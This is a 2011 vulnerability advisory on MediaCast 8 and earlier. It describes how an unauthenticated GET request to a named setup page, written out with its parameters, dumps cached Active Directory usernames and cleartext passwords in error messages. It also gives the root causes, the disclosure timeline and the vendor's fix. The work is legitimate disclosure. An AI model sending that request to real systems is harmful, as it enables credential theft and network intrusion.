 Advisory:      MediaCast Password Dump Vulnerability
	      
 Release Date:  04/25/2011

      Author:   Daniel Clemens [daniel.clemens[at]packetninjas.net]

 Application:   MediaCast <= 8 (By Inventive, Inc) - http://www.InventiveTec.com
 Description:

Vulnerabilities exist within the MediaCast application have been discovered that allow
an unauthenticated user  to force the application to return critical values (Username 
and Password Information) to the end user within verbose error messages. 

By sending a GET request to /authenticate_ad_setup_finished.cfm?UserID=<ID>&ClearSession=1 
( or /authenticate_ad_setup_finished.cfm?UserID=<ID> ) 
usernames and passwords of previously cached Active Directory
credentials would be displayed as well as specific application level user name and 
password information (which at times could differ from AD credentials if the 
credentials have been updated within Active Directory and the user hasn't logged into
the web application with new credentials). 

The impact of this vulnerability is that an attacker has the ability to enumerate sequential 
usernames as well as the clear text passwords associated with users within the application 
and Active Directory Domain. 

Further review of the root cause of this vulnerability was not performed during the analysis 
of this vulnerability since these issues were discovered during a remote penetration test
of a network in contrast to a dedicated application review.  

Besides obvious correlation between verbose error message output and 
incorrect or non-existant exception handlers, it appears that this vulnerability 
exists due because the following conditions met:
* Incorrect Session Handling and Implementation (on /authenticate_ad_setup_finished.cfm)
* Incorrect Logic implementation
* Clear Text Storage of password information
* Active ldap integration with existing Active Directory Domain
* Possibly a problem with the cold fusion dll that is aiding in the AD integration....


Risk:          Critical 
Vendor Status: Patch Available

Disclosure Timeline:
 July 21, 2010   - Initial Contact with client using MediaCAST which enabled remote root of network
                    during remote penetration test.  
 August 11, 2010 - Email contact as well as phone calls placed to vendor 
 August x, 2010  - Multiple calls to developers, support etc. 
 August 24, 2010 - Vendor Response
                 "You are correct that the system was displaying verbose error messages that contained 
                 information that could be used in a nefarious way. 
                 I have turned off the display of this extended debugging information.  
                 I have also addressed the issue with the /authenticate_ad_setup_finished.cfm URL 
                 such that it traps the problematic condition and redirects the user to the login page."
				
Recommendation:
 - Patch to the most current version of MediaCast, or patch current MediaCast application.
